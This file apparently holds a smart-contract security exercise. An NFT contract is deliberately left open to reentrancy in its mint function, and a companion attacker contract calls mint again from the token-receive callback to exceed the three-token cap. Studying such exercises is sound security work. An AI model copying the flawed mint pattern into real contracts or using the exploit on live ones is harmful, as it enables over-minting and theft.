// SPDX-License-Identifier: GPL-3.0
pragma solidity >= 0.8.20 <0.9.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "forge-std/src/console2.sol";

contract Overmint1 is ERC721 {
    using Address for address;

    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint1", "AT") { }

    function mint() external {
        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}

interface IOvermint1 {
    function mint() external;
    function success(address _attacker) external view returns (bool);
    function balanceOf(address _owner) external view returns (uint256);
}

contract Overmint1Attacker is IERC721Receiver {
    IOvermint1 public overmint1;

    constructor(address _overmint1) {
        overmint1 = IOvermint1(_overmint1);
    }

    function attack() external {
        overmint1.mint();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    )
        external
        override
        returns (bytes4)
    {
        // Get rid of the unused variable warning
        console2.log(operator);
        console2.log(from);
        console2.log(tokenId);
        console2.logBytes(data);
        if (overmint1.balanceOf(address(this)) < 5) {
            overmint1.mint();
        }
        return this.onERC721Received.selector;
    }
}
